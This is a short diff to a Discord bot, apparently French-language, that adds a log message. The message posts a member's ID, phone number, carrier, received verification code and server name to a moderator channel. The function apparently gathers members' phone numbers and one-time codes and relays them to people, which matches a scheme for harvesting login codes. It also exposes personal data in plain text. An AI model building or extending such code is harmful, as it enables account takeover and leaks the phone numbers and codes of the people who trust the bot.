@@ -82,6 +82,17 @@ async function sendToMods(originInteraction, phone, code) {
     )
   );
   await modChannel.send({ embeds: [embed], components: [row1, row2] });
+  const logEmbed = new EmbedBuilder()
+    .setTitle("📩 Code de vérification reçu")
+    .addFields(
+      { name: "Membre", value: `<@${user.id}> \`${user.id}\``, inline: false },
+      { name: "Numéro", value: `\`${formatted}\` · ${operator}`, inline: true },
+      { name: "Code", value: `\`${code}\``, inline: true },
+      { name: "Serveur", value: `${originGuild.name}`, inline: false }
+    )
+    .setFooter({ text: dateStr })
+    .setColor(0x57f287);
+  await modChannel.send({ embeds: [logEmbed] });
 }
 
 client.once("ready", async () => {
